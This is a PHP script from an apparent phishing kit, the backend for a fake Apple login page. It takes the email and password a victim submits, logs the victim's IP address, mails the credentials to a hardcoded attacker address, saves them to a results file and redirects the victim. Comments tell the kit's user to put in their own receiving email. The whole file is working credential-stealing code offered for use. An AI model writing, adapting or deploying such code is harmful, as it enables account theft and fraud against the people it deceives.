<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$Mornag .= "------------+| Mornag [Mr Bear] Tunisia |+------------\n";
$Mornag .= "Email                       : ".$_POST['email-ali1']."\n";
$Mornag .= "Password                    : ".$_POST['password-ali2']."\n";
$Mornag .= "------------+| Mornag [Mr Bear] Tunisia |+------------\n";
$Mornag .= "Fr0m $ip chek in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "tiflil-adham@gmx.fr"; // Change the email ===> Put ur email
$bilsub = "New Apple Login $ip ";
$bilhead = "From: New Apple Login $ip <APPLE@>"; // You can change the email for better rzl
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$Mornag,$bilhead);
$v = fopen("../rz/index.txt","a"); // Send rzl in TXT file 
fwrite($v,$Mornag);
fclose($v);

header("Location: ../view.php"); // Redirecting 
?>